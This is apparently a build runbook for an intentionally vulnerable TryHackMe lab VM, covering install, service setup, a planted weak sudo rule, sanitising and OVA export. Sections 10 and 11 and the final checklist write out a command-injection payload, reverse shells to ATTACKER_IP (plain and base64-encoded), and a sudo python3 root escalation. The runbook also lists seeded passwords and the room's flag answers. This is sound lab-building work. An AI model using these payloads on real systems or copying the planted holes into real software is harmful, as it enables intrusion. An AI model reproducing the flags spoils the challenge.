# ForgeTrack VM build runbook (Ubuntu 20.04/22.04/24.04, under 3 GB OVA)

End-to-end build for the TryHackMe room. Result: a ~1.7 GB guest and a
~1 GB OVA with the intended easy chain:

`/diagnostics/ping` command injection -> `www-data` -> weak sudo rule -> `root`

> Intentionally vulnerable. Keep it on an isolated lab network.

## Automated install (recommended)

From the extracted project folder:

```bash
sudo bash install.sh
```

The installer performs sections 1–12 below: packages, app copy, venv,
PostgreSQL, env file, systemd, Nginx, the weak sudo rule, and the flag files.

Useful flags:

```bash
sudo bash install.sh --reset       # rebuild database and flag files
sudo bash install.sh --no-privesc  # skip the weak sudo rule
sudo bash install.sh --no-flags    # skip user/root flag files
sudo bash install.sh --no-ufw      # do not enable UFW
```

After it finishes, continue with section 13 (sanitise/trim) and section 14
(export). Replace the placeholder flags before export.

## 0. What you need

- Ubuntu Server 20.04 / 22.04 / 24.04 LTS ISO (or cloud image)
- VirtualBox 7.x (VMware works too; commands differ at export)
- The `redline-forge` project, including:
  - `app/lab_diagnostics.py` (the vulnerable blueprint)
  - `app/templates/diagnostics.html`
  - `scripts/compact-vm.sh`
- An attack machine with `nc`

Target VM: 2 vCPU, 2048 MB RAM, 4 GB dynamically allocated disk, NAT or
bridged networking, OpenSSH server.

## 1. Install Ubuntu

1. Create the VM, attach the ISO, boot.
2. Install **Ubuntu Server (minimized)**.
3. Guided storage: use the whole disk, **do not enable LVM**.
4. Install OpenSSH server. Skip the featured snaps.
5. Create the admin user `labadmin`.

If the installer refuses a 4 GB disk, use 6 GB. The disk is sparse, so the host
file and OVA stay small.

First boot:

```bash
sudo apt update
sudo apt full-upgrade -y
sudo apt install -y --no-install-recommends \
  nginx postgresql python3 python3-venv python3-pip iputils-ping ufw \
  ca-certificates curl rsync
```

Remove swap (saves 1-2 GB in the image):

```bash
sudo swapoff -a
sudo sed -i -E '/[[:space:]]swap[[:space:]]/d' /etc/fstab
sudo rm -f /swap.img
free -h
```

## 2. Transfer the app

From your workstation:

```bash
scp -r /mnt/D/internship/tryhackme/redline-forge labadmin@VM_IP:/tmp/
```

On the VM:

```bash
sudo mkdir -p /opt/forgetrack
sudo rsync -a /tmp/redline-forge/ /opt/forgetrack/
sudo rm -rf /opt/forgetrack/.pytest_cache /opt/forgetrack/tests \
            /opt/forgetrack/tmp /opt/forgetrack/output
sudo find /opt/forgetrack -name '__pycache__' -type d -prune -exec rm -rf {} +
```

## 3. Python environment

`install.sh` selects the dependency set automatically. On Ubuntu 20.04
(Python 3.8) it installs Flask 2.3.3 and Werkzeug 2.3.7; on Ubuntu 22.04/24.04
(Python 3.9+) it installs Flask 3.1.0.

Manual equivalent:

```bash
sudo python3 -m venv /opt/forgetrack/venv
```

On Python 3.8:

```bash
sudo /opt/forgetrack/venv/bin/pip install --upgrade 'pip<25'
sudo /opt/forgetrack/venv/bin/pip install --no-cache-dir \
  Flask==2.3.3 Werkzeug==2.3.7 Jinja2==3.1.4 MarkupSafe==2.1.5 \
  itsdangerous==2.1.2 click==8.1.7 blinker==1.6.2 \
  importlib-metadata==6.7.0 zipp==3.15.0 \
  psycopg2-binary==2.9.10 gunicorn==23.0.0
```

On Python 3.9+:

```bash
sudo /opt/forgetrack/venv/bin/pip install --upgrade pip
sudo /opt/forgetrack/venv/bin/pip install --no-cache-dir \
  Flask==3.1.0 psycopg2-binary==2.9.10 gunicorn==23.0.0
```

No pytest in the VM. Do not install system-wide pip or build tools.

## 4. PostgreSQL

```bash
sudo systemctl enable --now postgresql

sudo -u postgres createdb forgetrack
sudo -u postgres psql -d forgetrack -v ON_ERROR_STOP=1 \
  -f /opt/forgetrack/database/init.sql
sudo -u postgres psql -d forgetrack -v ON_ERROR_STOP=1 \
  -f /opt/forgetrack/database/seed.sql
```

Verify as the app role:

```bash
PGPASSWORD=forge_app_lab_password psql -h 127.0.0.1 -U forge_app \
  -d forgetrack -c 'SELECT count(*) AS cars FROM cars;'
```

Expected: 7.

If you need to reset later, drop the database **and** the roles first:

```bash
sudo -u postgres dropdb --if-exists forgetrack
sudo -u postgres dropuser --if-exists forge_app
sudo -u postgres dropuser --if-exists forge_owner
```

then repeat the create/load commands.

## 5. Environment file

```bash
SECRET_KEY=$(openssl rand -hex 32)

sudo tee /etc/forgetrack.env >/dev/null <<EOF
DATABASE_URL=postgresql://forge_app:forge_app_lab_password@127.0.0.1:5432/forgetrack
SECRET_KEY=$SECRET_KEY
PYTHONUNBUFFERED=1
EOF

sudo chown root:root /etc/forgetrack.env
sudo chmod 600 /etc/forgetrack.env
```

## 6. systemd service

```bash
sudo tee /etc/systemd/system/forgetrack.service >/dev/null <<'EOF'
[Unit]
Description=ForgeTrack Flask application
After=network-online.target postgresql.service
Wants=network-online.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/opt/forgetrack/app
EnvironmentFile=/etc/forgetrack.env
ExecStart=/opt/forgetrack/venv/bin/gunicorn \
    --workers 2 \
    --bind 127.0.0.1:8080 \
    --access-logfile - \
    --error-logfile - \
    app:app
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now forgetrack
sudo systemctl status forgetrack --no-pager
```

## 7. Nginx

```bash
sudo tee /etc/nginx/sites-available/forgetrack >/dev/null <<'EOF'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;

    location /static/ {
        alias /opt/forgetrack/app/static/;
        expires 1h;
        access_log off;
    }

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF

sudo rm -f /etc/nginx/sites-enabled/default
sudo ln -sf /etc/nginx/sites-available/forgetrack /etc/nginx/sites-enabled/forgetrack
sudo nginx -t
sudo systemctl reload nginx
```

If Apache is installed: `sudo systemctl disable --now apache2`.

## 8. Permissions and firewall

```bash
sudo chown -R root:www-data /opt/forgetrack
sudo chmod -R u=rwX,g=rX,o= /opt/forgetrack
```

Do not use `chmod 777`.

```bash
sudo ufw allow OpenSSH
sudo ufw allow 80/tcp
sudo ufw --force enable
sudo ufw status verbose
```

Never open 5432 or 8080 externally.

## 9. Verify the app

```bash
curl -sS http://127.0.0.1/ | grep -o 'Built for the next lap'
curl -sS http://127.0.0.1/cars | grep -o 'Toyota GR86'
curl -sS http://127.0.0.1/diagnostics | grep -o 'Network diagnostics'
```

Seeded logins:

| Username | Password |
|---|---|
| `pitwall.27` | `ForgePitwall27!` |
| `nova.88` | `ForgeNova88!` |
| `vortex.41` | `ForgeVortex41!` |
| `slipstream.09` | `ForgeSlipstream09!` |
| `sora.kade` | `ForgeSoraKade!` |

## 10. Foothold: command injection

The vulnerable code is already in `app/lab_diagnostics.py` and is registered in
`app/app.py`. Test normal use:

```bash
curl -sS 'http://127.0.0.1/diagnostics/ping?host=127.0.0.1' | grep -o 'bytes from'
```

Test injection:

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; id' \
  http://127.0.0.1/diagnostics/ping | grep -o 'uid=.*'
```

Expected in the VM: `uid=33(www-data)`.

### Reverse shell

On your attack machine:

```bash
nc -lvnp 4444
```

From the target (replace IPs):

```bash
curl -sS -G \
  --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >/dev/null 2>&1 &" \
  http://TARGET_IP/diagnostics/ping
```

Base64 fallback if quoting breaks:

```bash
PAYLOAD=$(printf '%s' "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64 -w0)
curl -sS -G \
  --data-urlencode "host=127.0.0.1; echo $PAYLOAD | base64 -d | bash &" \
  http://TARGET_IP/diagnostics/ping
```

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then `Ctrl-Z`, and on the attack machine:

```bash
stty raw -echo; fg
export TERM=xterm
```

## 11. Privesc: weak sudo rule

On the VM:

```bash
sudo tee /etc/sudoers.d/90-forgetrack-diag >/dev/null <<'EOF'
# INTENTIONALLY WEAK LAB RULE
Defaults:www-data !authenticate
www-data ALL=(root) NOPASSWD: /usr/bin/python3
EOF

sudo chmod 0440 /etc/sudoers.d/90-forgetrack-diag
sudo visudo -cf /etc/sudoers.d/90-forgetrack-diag
```

Test:

```bash
sudo -u www-data -H sudo -n -l
sudo -u www-data -H sudo -n /usr/bin/python3 -c 'import os; os.system("id")'
```

From the `www-data` shell:

```bash
sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id
```

Expected: `uid=0(root)`.

## 12. Flags

Create the low-privilege account:

```bash
sudo adduser --disabled-password --gecos "" forge
sudo passwd -l forge
```

User flag, readable by `www-data` after the foothold:

```bash
sudo tee /home/forge/user.txt >/dev/null <<'EOF'
THM{f0rge_us3r_1881f0f3}
EOF
sudo chown root:www-data /home/forge/user.txt
sudo chmod 640 /home/forge/user.txt
sudo chmod 755 /home/forge
```

Root flag, root-only:

```bash
echo 'THM{f0rge_r00t_6d28fc4c}' | sudo tee /root/root.txt >/dev/null
sudo chmod 400 /root/root.txt
```

These are the values registered in the TryHackMe room. Keep them in sync if
you rebuild the VM.

## 13. Sanitise

### 13.1 Remove build artefacts and spoilers

```bash
sudo rm -rf /opt/forgetrack/docs \
            /opt/forgetrack/database \
            /opt/forgetrack/tests \
            /opt/forgetrack/README.md \
            /opt/forgetrack/docker-compose.yml \
            /opt/forgetrack/.gitignore \
            /opt/forgetrack/output \
            /opt/forgetrack/tmp
sudo find /opt/forgetrack -name '__pycache__' -type d -prune -exec rm -rf {} +
sudo find /opt/forgetrack -name '*.pyc' -delete
sudo rm -rf /tmp/redline-forge
```

`database/seed.sql` contains the web challenge flags, and `docs/` contains the
walkthrough. Do not ship either.

### 13.2 Clear history and logs

```bash
history -c
rm -f ~/.bash_history ~/.sudo_as_admin_successful ~/.lesshst \
      ~/.viminfo ~/.nano_history ~/.wget-hsts
sudo rm -f /root/.bash_history /root/.sudo_as_admin_successful \
            /root/.psql_history /home/*/.bash_history \
            /home/*/.psql_history /var/lib/postgresql/.psql_history

sudo journalctl --rotate
sudo journalctl --vacuum-time=1s
sudo find /var/log -type f -exec truncate -s 0 {} +
sudo rm -rf /var/log/installer /var/log/cloud-init* /var/log/unattended-upgrades
sudo rm -f /var/backups/*
```

### 13.3 Remove host identity

```bash
sudo truncate -s 0 /etc/machine-id
sudo rm -f /var/lib/dbus/machine-id
sudo ln -s /etc/machine-id /var/lib/dbus/machine-id

sudo rm -f /etc/ssh/ssh_host_*
sudo ssh-keygen -A
sudo rm -f /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys \
            /root/.ssh/known_hosts /home/*/.ssh/known_hosts
```

### 13.4 Lock the build account

Take a VirtualBox snapshot first. Then:

```bash
sudo passwd -l labadmin
```

You can still test through the web app and the attack chain. Delete the
snapshot before export.

### 13.5 Network: reset to DHCP, do not delete it

Deleting `/etc/netplan` entirely breaks the room. Reset the interface to DHCP
instead:

```bash
IFACE=$(ip -br link | awk '$1 != "lo" {print $1; exit}')

sudo rm -f /etc/netplan/*.yaml
sudo tee /etc/netplan/01-lab.yaml >/dev/null <<EOF
network:
  version: 2
  ethernets:
    $IFACE:
      dhcp4: true
EOF

sudo chmod 600 /etc/netplan/01-lab.yaml
sudo netplan apply
```

Remove any leftover static connection profiles:

```bash
sudo rm -rf /etc/NetworkManager/system-connections/*
```

### 13.6 Shrink the guest

Run the trim script *before* deleting `scripts/`:

```bash
sudo bash /opt/forgetrack/scripts/compact-vm.sh
df -h /
```

Expected: ~1.6-1.9 GB used. The script removes swap, `snapd`,
`linux-firmware`, docs/man pages, APT caches, logs, pip caches, and zeroes free
space.

Confirm services still run:

```bash
systemctl is-active nginx postgresql forgetrack
curl -sS -o /dev/null -w '%{http_code}\n' http://127.0.0.1/
```

Then remove the last build script:

```bash
sudo rm -rf /opt/forgetrack/scripts
```

## 14. Export the OVA

Shut down:

```bash
sudo poweroff
```

Delete any snapshots (VirtualBox GUI: Snapshots -> Delete All). Snapshots make
the OVA much larger.

Compact the disk and export:

```bash
VBoxManage list vms
VBoxManage modifymedium disk "/path/to/ForgeTrack.vdi" --compact
VBoxManage export ForgeTrack --output ForgeTrack.ova
ls -lh ForgeTrack.ova
```

The exported disk is a stream-optimized VMDK, which is compressed. If the OVA
is still above 3 GB:

- check swap was removed: `VBoxManage showmediuminfo disk "ForgeTrack.vdi"`
- check for leftover snapshots
- check `df -h /` inside the guest
- confirm `linux-firmware` and `snapd` are gone: `dpkg -l | grep -E 'linux-firmware|snapd'`
- re-export with `ovftool --compress=9 ForgeTrack.vmx ForgeTrack.ova`

VMware equivalent:

```bash
vmware-vdiskmanager -k ForgeTrack.vmdk
ovftool --compress=9 ForgeTrack.vmx ForgeTrack.ova
```

## 15. Final room test

Import the OVA into a clean VM, boot it, and confirm:

1. The VM gets a DHCP address.
2. `http://TARGET_IP/` shows the ForgeTrack dashboard.
3. `/diagnostics` is reachable from the nav.
4. `127.0.0.1; id` returns `www-data`.
5. The reverse shell lands.
6. `sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` gives root.
7. `cat /home/forge/user.txt` works as `www-data`.
8. `cat /root/root.txt` works as root.
9. No `/opt/forgetrack/docs`, `database/`, or `scripts/` remain.
10. `~/.bash_history` is empty for `root` and `labadmin`.

Upload the OVA to TryHackMe and set the room's flags to match the two files.
